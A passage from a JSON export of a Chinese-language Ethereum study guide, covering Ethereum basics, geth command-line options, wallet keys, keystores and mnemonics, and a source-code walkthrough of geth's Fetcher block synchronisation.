3）\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/2.以太坊相关术语":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/2.以太坊相关术语","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/2.以太坊相关术语.md","title":"2.以太坊相关术语","links":[],"tags":[],"content":"\n文章以及资料（开源）：github地址\n\n[TOC]"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/B+Tree和bolt优化leveldb":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/B+Tree和bolt优化leveldb","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/B+Tree和bolt优化leveldb.md","title":"B+Tree和bolt优化leveldb","links":[],"tags":[],"content":""},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/merkle-tree详解":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/merkle-tree详解","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/merkle tree详解.md","title":"merkle tree详解","links":[],"tags":[],"content":"kndrck.co/posts/efficient-merkletrees-zk-proofs/"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/verkle-tree-详解":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/verkle-tree-详解","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/verkle tree 详解.md","title":"verkle tree 详解","links":[],"tags":[],"content":"blog.ethereum.org/2021/12/02/verkle-tree-structure"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/以太坊介绍":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/以太坊介绍","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/以太坊介绍.md","title":"以太坊介绍","links":[],"tags":[],"content":"\n文章以及资料（开源）：github地址\n\n[TOC]\n定义\n以太坊（英语：Ethereum）是一个开源的有智能合约功能的公共区块链平台。通过其专用加密货币以太币（Ether，又称“以太币”）提供去中心化的虚拟机（称为“以太虚拟机”Ethereum Virtual Machine）来处理点对点合约。\n特点\n相较于较大多数其他加密货币或区块链技术，以太坊的特点包括下列：\n\n智能合约（smart contract）：存储在区块链上的程序，由各节点运行，需要运行程序的人支付手续费给节点的矿工或权益人。\n分布式应用程序：以太坊上的分布式应用程序不会停机，也不能被关掉。\n代币（tokens）：智能合约可以创造代币供分布式应用程序使用。分布式应用程序的代币化让用户、投资者以及管理者的利益一致。代币也可以用来进行首次代币发行。\n叔块（uncle block）：将因为速度较慢而未及时被收入母链的较短区块链并入，以提升交易量。使用的是有向无环图的相关技术。\n权益证明（proof-of-stake）：相较于工作量证明更有效率，可节省大量在挖矿时浪费的电脑资源，并避免特殊应用集成电路造成网络中心化。（测试中）\n\n第二层功能\n除了在主链上运行的各种功能，为了支持智能合约所需的高运算量以及资料容量，以太坊也积极开发第二层功能来减轻主链的负担，扩展其实用规模。目前的主要方案包括以下：\n\n支链：用较小的分支区块链运算，只将最后结果写入主链，可提升供单位时间的工作量。\n\nPlasma支链：2020年6月起由OMG测试中\nRollup支链：2019年开发团队将重心由Plasma转移至Rollup，目前正在开发中\n\n\n状态通道（state channels）：原理类似比特币的闪雷网络，可提升交易速度、降低区块链的负担，并提高可扩展性。尚未实现，开发团队包括雷电网络（Raiden Network）和移动性网络（Liquidity Network）\n分片（sharding）：减少每个节点所需纪录的资料量，并透过平行运算提升效率（尚未实现）\n\n以太币\n以太坊区块链上的代币称为以太币（Ether），代码为ETH，可在许多加密货币的外汇市场上交易，它也是以太坊上用来支付交易手续费和运算服务的介质。以太币的总发行量不明，因为权益证明的具体运作方式仍在研究中，而虽然难度炸弹限制了工作量证明的挖扩的区块数量上限，但因为叔块也有奖励，而且叔块的数量并不一定，造成确切数量难以估算。\n以太币对其他实体货币的汇率可能在短时间内大幅变化，例如2016年 The DAO 被骇时，对美元的汇率从 21.50 跌至 15，而2017年初到2018年初的的一年间从大约10美金涨到1400美元。\n布特林在 2016 年 4 月售出手上持有的四分之一以太币，造成一些人质疑，而他本人则说这是理财上很合理的分散风险，并引用前比特币开发员 Gavin Andresen 说这一切都还只是一场实验，仍有失败的可能。\n智能合约\n以太坊最重要的技术贡献就是智能合约。智能合约是存储在区块链上的程序，可以协助和验证合约的谈判和运行。以太坊的智能合约可以数种用图灵完备的编程语言写成。纽约时报称以太坊平台是一台由众多用户构成的网络来运转的公用电脑，并用以太币来分配和支付这台电脑的使用权。经济学人则说明智能合约可以让众多组织的数据库得以用低廉的成本交互，并且让用户写下精密的合约，功能之一是产生去中心化自治组织，也就是一间只是由以太坊合约构成的虚拟公司。\n因为合约内容公开，合约可以证明其宣称的功能是真实的，例如虚拟赌场可以证明它是公平的。另一方面，合约的公开性也表示如果合约中有漏洞，任何人都可以立刻看到，而修正程序可能会需要一些时间。The DAO 就是一个例子，无法即时阻止。\n智能合约的许多细节仍在研究中，包括如何验证合约的功能。微软研究院的报告指出要写出完善的合约可能非常困难，讨论了微软开发的一些可以用来验证合约的工具，并提到如果大规模分析各个已发布的合约，可能发现找出大量的漏洞。报告也说可以证明Solidity程序和以太虚拟机编码的等同性。\n以太坊组件\np2p网络\n以太坊运行在Ethereum Main Network上，这是一个通过TCP 30303端口寻址的网络，网络层运行的协议名为-D ΞVp2p\n共识规则\n以太坊的共识规则，由以太坊黄皮书（见后文中的“扩展阅读”）中的参考标准进行精确定义\n交易\n以太坊交易是一个网络消息，主要包含交易的发送方、接收方、价值和数据载荷\n状态机\n以太坊的状态转换由以太坊虚拟机（EVM）处理，这是一个基于栈的虚拟机，执行bytecode（字节码指令）。被称为“智能合约”的EVM程序采用高级语言（例如Solidity）编写，并编译为通过EVM执行的字节码。\n数据结构\n以太坊的区块链以数据库（通常采用Google的LevelDB）的方式保存在每一个节点之上，区块链内包含了交易和系统的状态，经过哈希处理的数据保存在Merkle Patricia Tree数据结构之内。\n经济安全性\n以太坊当前使用名为Ethash的工作量证明算法，这个算法迟早将被放弃，并切换到PoS。\n扩展阅读\n\n以太坊黄皮书：ethereum.github.io/yellowpaper/paper.pdf\n黄皮书的简单版本：github.com/chronaeon/beigepaper\nDΞVp2p网络协议：github.com/ethereum/wiki/wiki/%C3%90%CE%9EVp2p-Wire-Protocol\n以太坊虚拟机相关资源：github.com/ethereum/wiki/wiki/Ethereum-Virtual-Machine-(EVM)-Awesome-List\nMPT规范：github.com/ethereum/wiki/wiki/Patricia-Tree\ncasper第一版协议：github.com/ethereum/research/wiki/Casper-Version-1-Implementation-Guide\n《深入理解以太坊》\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/以太坊启动参数详解":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/以太坊启动参数详解","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/以太坊启动参数详解.md","title":"以太坊启动参数详解","links":[],"tags":[],"content":"\n文章以及资料（开源）：github地址\n\n[TOC]\n命令\naccount    管理账户\nattach     启动交互式JavaScript环境（连接到节点）\nbug        上报bug Issues\nconsole    启动交互式JavaScript环境\ncopydb     从文件夹创建本地链\ndump       Dump（分析）一个特定的块存储\ndumpconfig 显示配置值\nexport     导出区块链到文件\nimport     导入一个区块链文件\ninit       启动并初始化一个新的创世纪块\njs         执行指定的JavaScript文件(多个)\nlicense    显示许可信息\nmakecache  生成ethash验证缓存(用于测试)\nmakedag    生成ethash 挖矿DAG(用于测试)\nmonitor    监控和可视化节点指标\nremovedb   删除区块链和状态数据库\nversion    打印版本号\nwallet     管理Ethereum预售钱包\nhelp,h     显示一个命令或帮助一个命令列表\n\n\nETHEREUM 选项\n--config value          TOML 配置文件\n--datadir “xxx”         数据库和keystore密钥的数据目录\n--keystore              keystore存放目录(默认在datadir内)\n--nousb                 禁用监控和管理USB硬件钱包\n--networkid value       网络标识符(整型, 1=Frontier, 2=Morden (弃用), 3=Ropsten, 4=Rinkeby) (默认: 1)\n--testnet               Ropsten网络:预先配置的POW(proof-of-work)测试网络\n--rinkeby               Rinkeby网络: 预先配置的POA(proof-of-authority)测试网络\n--syncmode &quot;fast&quot;       同步模式 (&quot;fast&quot;, &quot;full&quot;, or &quot;light&quot;)\n--ethstats value        上报ethstats service  URL (nodename:secret@host:port)\n--identity value        自定义节点名\n--lightserv value       允许LES请求时间最大百分比(0 – 90)(默认值:0) \n--lightpeers value      最大LES client peers数量(默认值:20)\n--lightkdf              在KDF强度消费时降低key-derivation RAM&amp;CPU使用\n\n\n开发者模式\n--dev               使用POA共识网络，默认预分配一个开发者账户并且会自动开启挖矿。\n--dev.period value  开发者模式下挖矿周期 (0 = 仅在交易时) (默认: 0)\n\nETHASH选项\n--ethash.cachedir                        ethash验证缓存目录(默认 = datadir目录内)\n--ethash.cachesinmem value               在内存保存的最近的ethash缓存个数  (每个缓存16MB ) (默认: 2)\n--ethash.cachesondisk value              在磁盘保存的最近的ethash缓存个数 (每个缓存16MB) (默认: 3)\n--ethash.dagdir &quot;&quot;                       存ethash DAGs目录 (默认 = 用户hom目录)\n--ethash.dagsinmem value                 在内存保存的最近的ethash DAGs 个数 (每个1GB以上) (默认: 1)\n--ethash.dagsondisk value                在磁盘保存的最近的ethash DAGs 个数 (每个1GB以上) (默认: 2)\n\n交易池选项\n--txpool.nolocals            为本地提交交易禁用价格豁免\n--txpool.journal value       本地交易的磁盘日志：用于节点重启 (默认: &quot;transactions.rlp&quot;)\n--txpool.rejournal value     重新生成本地交易日志的时间间隔 (默认: 1小时)\n--txpool.pricelimit value    加入交易池的最小的[gas](learnblockchain.cn/2019/06/11/gas-mean/)价格限制(默认: 1)\n--txpool.pricebump value     价格波动百分比（相对之前已有交易） (默认: 10)\n--txpool.accountslots value  每个帐户保证可执行的最少交易槽数量  (默认: 16)\n--txpool.globalslots value   所有帐户可执行的最大交易槽数量 (默认: 4096)\n--txpool.accountqueue value  每个帐户允许的最多非可执行交易槽数量 (默认: 64)\n--txpool.globalqueue value   所有帐户非可执行交易最大槽数量  (默认: 1024)\n--txpool.lifetime value      非可执行交易最大入队时间(默认: 3小时)\n\n性能调优选项\n--cache value                分配给内部缓存的内存MB数量，缓存值(最低16 mb /数据库强制要求)(默认:128)\n--trie-cache-gens value      保持在内存中产生的trie node数量(默认:120)\n\n账户选项\n--cache value                分配给内部缓存的内存MB数量，缓存值(最低16 mb /数据库强制要求)(默认:128)\n--trie-cache-gens value      保持在内存中产生的trie node数量(默认:120)\nallow-insecure-unlock\t\t\t\t 用于解锁账户\n\nAPI 和控制台选项\n--rpc                       启用HTTP-RPC服务器\n--rpcaddr value             HTTP-RPC服务器接口地址(默认值:“localhost”)\n--rpcport value             HTTP-RPC服务器监听端口(默认值:8545)\n--rpcapi value              基于HTTP-RPC接口提供的API\n--ws                        启用WS-RPC服务器\n--wsaddr value              WS-RPC服务器监听接口地址(默认值:“localhost”)\n--wsport value              WS-RPC服务器监听端口(默认值:8546)\n--wsapi  value              基于WS-RPC的接口提供的API\n--wsorigins value           websockets请求允许的源\n--ipcdisable                禁用IPC-RPC服务器\n--ipcpath                   包含在datadir里的IPC socket/pipe文件名(转义过的显式路径)\n--rpccorsdomain value       允许跨域请求的域名列表(逗号分隔)(浏览器强制)\n--jspath loadScript         JavaScript加载脚本的根路径(默认值:“.”)\n--exec value                执行JavaScript语句(只能结合console/attach使用)\n--preload value             预加载到控制台的JavaScript文件列表(逗号分隔)\n\n\n网络选项\n--bootnodes value    用于P2P发现引导的enode urls(逗号分隔)(对于light servers用v4+v5代替)\n--bootnodesv4 value  用于P2P v4发现引导的enode urls(逗号分隔) (light server, 全节点)\n--bootnodesv5 value  用于P2P v5发现引导的enode urls(逗号分隔) (light server, 轻节点)\n--port value         网卡监听端口(默认值:30303)\n--maxpeers value     最大的网络节点数量(如果设置为0，网络将被禁用)(默认值:25)\n--maxpendpeers value    最大尝试连接的数量(如果设置为0，则将使用默认值)(默认值:0)\n--nat value             NAT端口映射机制 (any|none|upnp|pmp|extip:&lt;IP&gt;) (默认: “any”)\n--nodiscover            禁用节点发现机制(手动添加节点)\n--v5disc                启用实验性的RLPx V5(Topic发现)机制\n--nodekey value         P2P节点密钥文件\n--nodekeyhex value      十六进制的P2P节点密钥(用于测试)\n\n\n矿工选项\n--mine                  打开挖矿\n--minerthreads value    挖矿使用的CPU线程数量(默认值:8)\n--etherbase value       挖矿奖励地址(默认=第一个创建的帐户)(默认值:“0”)\n--targetgaslimit value  目标gas限制：设置最低gas限制（低于这个不会被挖？） (默认值:“4712388”)\n--gasprice value        挖矿接受交易的最低gas价格\n--extradata value       矿工设置的额外块数据(默认=client version)\n\n\nGAS 价格选项：\n--gpoblocks value      用于检查gas价格的最近块的个数  (默认: 10)\n--gpopercentile value  建议gas价参考最近交易的gas价的百分位数，(默认: 50)\n\n虚拟机的选项：\n--vmdebug        记录VM及合约调试信息\n\n日志和调试选项：\n--metrics            启用metrics收集和报告\n--fakepow            禁用proof-of-work验证\n--verbosity value    日志详细度:0=silent, 1=error, 2=warn, 3=info, 4=debug, 5=detail (default: 3)\n--vmodule value      每个模块详细度:以 &lt;pattern&gt;=&lt;level&gt;的逗号分隔列表 (比如 eth/*=6,p2p=5)\n--backtrace value    请求特定日志记录堆栈跟踪 (比如 “block.go:271”)\n--debug                     突出显示调用位置日志(文件名及行号)\n--pprof                     启用pprof HTTP服务器\n--pprofaddr value           pprof HTTP服务器监听接口(默认值:127.0.0.1)\n--pprofport value           pprof HTTP服务器监听端口(默认值:6060)\n--memprofilerate value      按指定频率打开memory profiling    (默认:524288)\n--blockprofilerate value    按指定频率打开block profiling    (默认值:0)\n--cpuprofile value          将CPU profile写入指定文件\n--trace value               将execution trace写入指定文件\n\nWHISPER 实验选项：\n--shh                        启用Whisper\n--shh.maxmessagesize value   可接受的最大的消息大小 (默认值: 1048576)\n--shh.pow value              可接受的最小的POW (默认值: 0.2)\n\n弃用选项：\n--fast     开启快速同步\n--light    启用轻客户端模式\n\n其他选项：\n–help, -h    显示帮助\n\n\n参考：geth.ethereum.org/docs/interface/command-line-options\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/多项式承诺替换状态根":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/多项式承诺替换状态根","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/多项式承诺替换状态根.md","title":"多项式承诺替换状态根","links":[],"tags":[],"content":"ethresear.ch/t/using-polynomial-commitments-to-replace-state-roots/7095"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/无状态以太坊":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/无状态以太坊","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/无状态以太坊.md","title":"无状态以太坊","links":[],"tags":[],"content":"mirror.xyz/web3nomad.eth/yCmv1JOPNE0_F7joZU08oKBIDfM62Cqji6ZVYDVjdtQ\ncloud.tencent.com/developer/article/1186332\nblog.ethereum.org/2020/01/28/eth1x-files-the-stateless-ethereum-tech-tree"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/深入理解verkle-tree":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/深入理解verkle-tree","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/深入理解verkle tree.md","title":"深入理解verkle tree","links":[],"tags":[],"content":"\nzhuanlan.zhihu.com/p/500860920https://link.zhihu.com/%3A//math.mit.edu/research/highschool/primes/materials/2018/Kuszmaul.pdf)\nlearnblockchain.cn/article/2684\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/钱包系列/详解私钥、密码、keystore和助记词":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/钱包系列/详解私钥、密码、keystore和助记词","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/钱包系列/详解私钥、密码、keystore和助记词.md","title":"详解私钥、密码、keystore和助记词","links":[],"tags":[],"content":"\n文章以及资料（开源）：github地址\n\n[TOC]\n密码\n首先明白密码不是私钥，它是在创建账户时候的密码（注意可以修改）。密码在以下情况下会使用到：\n\n作为转账的支付密码\n用keystore导入钱包的时候需要输入的密码，用来解锁keystore的\n\n私钥\n私钥由64位长度的十六进制的字符组成，比如：0xA4356E49C88C8B7AB370AF7D5C0C54F0261AAA006F6BDE09CD4745CF54E0115A，一个账户只有一个私钥且不能修改，。通常一个钱包中私钥和公钥是成对出现的，有了私钥，我们就可以通过一定的算法生成公钥，再通过公钥经过一定的算法生成地址，这一过程都是不可逆的。私钥一定要妥善保管，若被泄漏别人可以通过私钥解锁账号转出你的该账号的数字货币。\nkeystore\nKeystore常见于以太坊钱包，它是将私钥以加密的方式保存为一份 JSON 文件，这份 JSON 文件就是 keystore，所以它就是加密后的私钥。Keystore必须配合钱包密码才能使用该账号。\nKeystore 文件大致样子：\n{\n    &quot;crypto&quot; : {\n        &quot;cipher&quot; : &quot;aes-128-ctr&quot;,\n        &quot;cipherparams&quot; : {\n            &quot;iv&quot; : &quot;83dbcc02d8ccb40e466191a123791e0e&quot;\n        },\n        &quot;ciphertext&quot; : &quot;d172bf743a674da9cdad04534d56926ef8358534d458fffccd4e6ad2fbde479c&quot;,\n        &quot;kdf&quot; : &quot;scrypt&quot;,\n        &quot;kdfparams&quot; : {\n            &quot;dklen&quot; : 32,\n            &quot;n&quot; : 262144,\n            &quot;r&quot; : 1,\n            &quot;p&quot; : 8,\n            &quot;salt&quot; : &quot;ab0c7876052600dd703518d6fc3fe8984592145b591fc8fb5c6d43190334ba19&quot;\n        },\n        &quot;mac&quot; : &quot;2103ac29920d71da29f15d75b4a16dbe95cfd7ff8faea1056c33131d846e3097&quot;\n    },\n    &quot;id&quot; : &quot;3198bc9c-6672-5ab3-d995-4942343ae5b6&quot;,\n    &quot;version&quot; : 3\n}\n\n名词解释：\n\ncipher：对称 AES 算法的名称;\ncipherparams：上述 cipher 算法需要的参数;\nciphertext：你的以太坊私钥使用上述 cipher 算法进行加密;\nkdf：密钥生成函数，用于让你用密码加密 keystore 文件;\nkdfparams：上述 kdf 算法需要的参数;\nMac：用于验证密码的代码。\n\n助记词\n私钥是64位长度的十六进制的字符，不利于记录且容易记错，所以用算法将一串随机数转化为了一串12 ~ 24个容易记住的单词，方便保存记录。注意：\n\n助记词是私钥的另一种表现形式\n助记词可以获取相关联的多个私钥，反过来私钥没法获取助记词。\n\n要弄清楚助记词与私钥的关系，得清楚BIP协议，是Bitcoin Improvement Proposals的缩写，意思是Bitcoin 的改进建议，用于提出 Bitcoin 的新功能或改进措施。BIP协议衍生了很多的版本，主要有BIP32、BIP39、BIP44。\n以太坊对BIP的支持\nBIP是用于提出 Bitcoin 的新功能或改进措施，那么对于以太坊来说如何支持呢？\n\n以太坊在EIPs/issues/84中讨论，是否遵循 BIP32 和 BIP44，社区里提出来很多有意思的观点，比特币是基于 UTXO 的，所以可以使用 HD 钱包（BIP32）为每个交易分配一个新地址，以保护您的隐私。然而，以太坊是基于帐户，每个帐户都有一个地址，BIP 是比特币的提案，而且比特币的数据结构的设计是围绕改变地址的想法构建的，BIP 的一些提案可能并不适合以太坊。以太坊的模式和比特币UTXO 不同，以太坊转账不能改变地址，如果在以太坊上实现 UTXO ，用户还必须签名两个交易以将余额的一部分发送到一个地址，将余额的一部分发送到第二个地址 - 这将使成本增加一倍，而且第二个交易可能不会在同一个区块中，当然以太坊也可以通过智能合约的方式实现。另外，以太坊目前官方钱包采用 KDF 的形式，也就是我们常说的 Keystore 的形式。\n以太坊在EIPs/issues/85中讨论，以太坊社区似乎也采用了 BIP32 的做法，提议 HD 路径为 : m/44&#039;/60&#039;/0&#039;/0/n，n 是第 n 次生成地址。目前以太坊客户端实现了BIP32的客户端有：Jaxx, Metamask, Exodus, imToken, TREZOR (ETH) &amp; Digital Bitbox。\n\n密码、私钥、keystore与助记词的关系\n\n如何解锁账户\n解锁账户有如下几种方式：\n\n私钥（Private Key）\nKeystore+密码（Keystore+Password）\n助记词（Mnemonic code）\n\n我们可以得到以下总结：\n\n通过私钥+密码可以生成keystore，即加密私钥。\n通过keystore+密码可以获取私钥，即解密keystore。\n通过助记词根据不同的路径获取不同的私钥，即使用HD钱包将助记词转化成种子来生成主私钥，然后派生海量的子私钥和地址。\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/钱包系列/账户抽象化":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/钱包系列/账户抽象化","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/钱包系列/账户抽象化.md","title":"账户抽象化","links":[],"tags":[],"content":"ethereum-magicians.org/t/implementing-account-abstraction-as-part-of-eth1-x/4020"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之Fetcher同步-6":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之Fetcher同步-6","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之Fetcher同步-6.md","title":"死磕以太坊源码分析之Fetcher同步-6","links":[],"tags":[],"content":"\n死磕以太坊源码分析之Fetcher同步\ngithub.com/blockchainGuide (文章资料在此，给个Star哦)\n\nFetcher 功能概述\n区块数据同步分为被动同步和主动同步:\n\n\n被动同步是指本地节点收到其他节点的一些广播的消息，然后请求区块信息。\n\n\n主动同步是指节点主动向其他节点请求区块数据，比如geth刚启动时的syning，以及运行时定时和相邻节点同步\n\n\nFetcher负责被动同步，主要做以下事情：\n\n收到完整的block广播消息(NewBlockMsg)\n收到blockhash广播消息(NewBlockHashesMsg)\n\n这两个消息又是分别由 peer.AsyncSendNewBlockHash 和 peer.AsyncSendNewBlock 两个方法发出的，这两个方法只有在矿工挖到新的区块时才会被调用：\n// 订阅本地挖到新的区块的消息\nfunc (pm *ProtocolManager) minedBroadcastLoop() {\n    for obj := range pm.minedBlockSub.Chan() {\n        if ev, ok := obj.Data.(core.NewMinedBlockEvent); ok {\n            pm.BroadcastBlock(ev.Block, true)  // First propagate block to peers\n            pm.BroadcastBlock(ev.Block, false) // Only then announce to the rest\n        }\n    }\n}\nfunc (pm *ProtocolManager) BroadcastBlock(block *types.Block, propagate bool) {\n    ......\n    if propagate {\n        ......\n        for _, peer := range transfer {\n            peer.AsyncSendNewBlock(block, td) //发送区块数据\n        }\n    }\n    if pm.blockchain.HasBlock(hash, block.NumberU64()) {\n        for _, peer := range peers {\n            peer.AsyncSendNewBlockHash(block) //发送区块哈希\n        }\n    }\n}\n所以，当某个矿工产生了新的区块、并将这个新区块广播给其它节点，而其它远程节点收到广播的消息时，才会用到 fetcher 模块去同步这些区块。\n\nfetcher的状态字段\n在 Fetcher 内部对区块进行同步时，会被分成如下几个阶段，并且每个阶段都有一个状态字段与之对应，用来记录这个阶段的数据：\n\nFetcher.announced:此阶段代表节点宣称产生了新的区块（这个新产生的区块不一定是自己产生的，也可能是同步了其它节点新产生的区块），Fetcher 对象将相关信息放到 Fetcher.announced 中，等待下载。\nFetcher.fetching：此阶段代表之前「announced」的区块正在被下载。\nFetcher.fetched：代表区块的 header 已下载成功，现在等待下载 body。\nFetcher.completing：代表 body 已经发起了下载，正在等待 body 下载成功。\nFetcher.queued:代表 body 已经下载成功。因此一个区块的数据：header 和 body 都已下载完成，此区块正在等待写入本地数据库。\n\nFetcher 同步区块哈希\n而新产生区块时，会使用消息 NewBlockHashesMsg 和 NewBlockMsg 对其进行传播。因此 Fetcher 对象也是从这两个消息处发现新的区块信息的。先来看同步区块哈希的过程。\ncase msg.Code == NewBlockHashesMsg:\n\t\tvar announces newBlockHashesData\n\t\tif err := msg.Decode(&amp;announces); err != nil {\n\t\t\treturn errResp(ErrDecode, &quot;%v: %v&quot;, msg, err)\n\t\t}\n\t\t// Mark the hashes as present at the remote node\n\t\t// 将hash 标记存在于远程节点上\n\t\tfor _, block := range announces {\n\t\t\tp.MarkBlock(block.Hash)\n\t\t}\n\t\t// Schedule all the unknown hashes for retrieval 检索所有未知哈希\n\t\tunknown := make(newBlockHashesData, 0, len(announces))\n\t\tfor _, block := range announces {\n\t\t\tif !pm.blockchain.HasBlock(block.Hash, block.Number) {\n\t\t\t\tunknown = append(unknown, block) // 本地不存在的话就扔到unkonwn里面\n\t\t\t}\n\t\t}\n\t\tfor _, block := range unknown {\n\t\t\tpm.fetcher.Notify(p.id, block.Hash, block.Number, time.Now(), p.RequestOneHeader, p.RequestBodies)\n\t\t}\n先将接收的哈希标记在远程节点上，然后去本地检索是否有这个哈希，如果本地数据库不存在的话，就放到unknown里面，然后通知本地的fetcher模块再去远程节点上请求此区块的header和body。 接下来进入到fetcher.Notify方法中。\nfunc (f *Fetcher) Notify(peer string, hash common.Hash, number uint64, time time.Time,\n\theaderFetcher headerRequesterFn, bodyFetcher bodyRequesterFn) error {\n\tblock := &amp;announce{\n\t\thash:        hash,\n\t\tnumber:      number,\n\t\ttime:        time,\n\t\torigin:      peer,\n\t\tfetchHeader: headerFetcher,\n\t\tfetchBodies: bodyFetcher,\n\t}\n\tselect {\n\tcase f.notify &lt;- block:\n\t\treturn nil\n\tcase &lt;-f.quit:\n\t\treturn errTerminated\n\t}\n它构造了一个 announce 结构，并将其发送给了 Fetcher.notify 这个 channel。注意 announce 这个结构里带着下载 header 和 body 的方法： fetchHeader 和 fetchBodies 。这两个方法在下面的过程中会讲到。 接下来我们进入到fetcher.go的loop函数中，找到notify，分以下几个内容：\n①：校验防止Dos攻击(限制为256个)\ncount := f.announces[notification.origin] + 1\n\t\t\tif count &gt; hashLimit {\n\t\t\t\tlog.Debug(&quot;Peer exceeded outstanding announces&quot;, &quot;peer&quot;, notification.origin, &quot;limit&quot;, hashLimit)\n\t\t\t\tpropAnnounceDOSMeter.Mark(1)\n\t\t\t\tbreak\n\t\t\t}\n②：新来的块号必须满足 chainHeight - blockno &lt; 7 或者 blockno - chainHeight &lt; 32\nif notification.number &gt; 0 {\n\t\t\t\tif dist := int64(notification.number) - int64(f.chainHeight()); dist &lt; -maxUncleDist || dist &gt; maxQueueDist {\n\t\t\t...\t\t\t}\n\t\t\t}\n③：准备下载header的fetching中存在此哈希则跳过\nif _, ok := f.fetching[notification.hash]; ok { \n  break\n\t\t\t}\n④：准备下载body的completing中存在此哈希也跳过\nif _, ok := f.completing[notification.hash]; ok {\n\t\t\t\tbreak\n\t\t\t}\n⑤：当确定fetching和completing不存在此区块哈希时，则把此区块哈希放入到announced中，准备拉取header和body。\nf.announced[notification.hash] = append(f.announced[notification.hash], notification)\n⑥：如果 Fetcher.announced 中只有刚才新加入的这一个区块哈希，那么调用 Fetcher.rescheduleFetch 重新设置变量 fetchTimer 的周期\nif len(f.announced) == 1 {\n\t\t\t\tf.rescheduleFetch(fetchTimer)\n\t\t\t}\n拉取header\n接下来就是到fetchTimer.C函数中：进行拉取header的操作了,具体步骤如下：\n①：选择要下载的区块，从 announced 转移到 fetching 中\nfor hash, announces := range f.announced {\n\t\t\t\tif time.Since(announces[0].time) &gt; arriveTimeout-gatherSlack {\n\t\t\t\t// 随机挑一个进行fetching\n\t\t\t\t\tannounce := announces[rand.Intn(len(announces))]\n\t\t\t\t\tf.forgetHash(hash)\n \n\t\t\t\t\t// If the block still didn&#039;t arrive, queue for fetching\n\t\t\t\t\tif f.getBlock(hash) == nil {\n\t\t\t\t\t\trequest[announce.origin] = append(request[announce.origin], hash)\n\t\t\t\t\t\tf.fetching[hash] = announce //\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n②：发送下载 header 的请求\n//发送所有的header请求\n\t\t\tfor peer, hashes := range request {\n\t\t\t\tlog.Trace(&quot;Fetching scheduled headers&quot;, &quot;peer&quot;, peer, &quot;list&quot;, hashes)\n\t\t\t\tfetchHeader, hashes := f.fetching[hashes[0]].fetchHeader, hashes\n\t\t\t\tgo func() {\n\t\t\t\t\tif f.fetchingHook != nil {\n\t\t\t\t\t\tf.fetchingHook(hashes)\n\t\t\t\t\t}\n\t\t\t\t\tfor _, hash := range hashes {\n\t\t\t\t\t\theaderFetchMeter.Mark(1)\n\t\t\t\t\t\tfetchHeader(hash) \n\t\t\t\t\t}\n\t\t\t\t}()\n\t\t\t}\n现在我们再回到f.notify函数中，找到p.RequestOneHeader，发送GetBlockHeadersMsg给远程节点，然后远程节点再通过case msg.Code == GetBlockHeadersMsg进行处理，本地区块链会返回headers，然后再发送回去。\norigin = pm.blockchain.GetHeaderByHash(query.Origin.Hash)\n...\np.SendBlockHeaders(headers)\n这时候我们请求的headers被远程节点给发送回来了，又是通过新的消息BlockHeadersMsg来传递的,当请求的 header 到来时，会通过两种方式来过滤header ：\n\nFetcher.FilterHeaders 通知 Fetcher 对象\n\ncase msg.Code == BlockHeadersMsg:\n....\nfilter := len(headers) == 1\nif filter {\n  headers 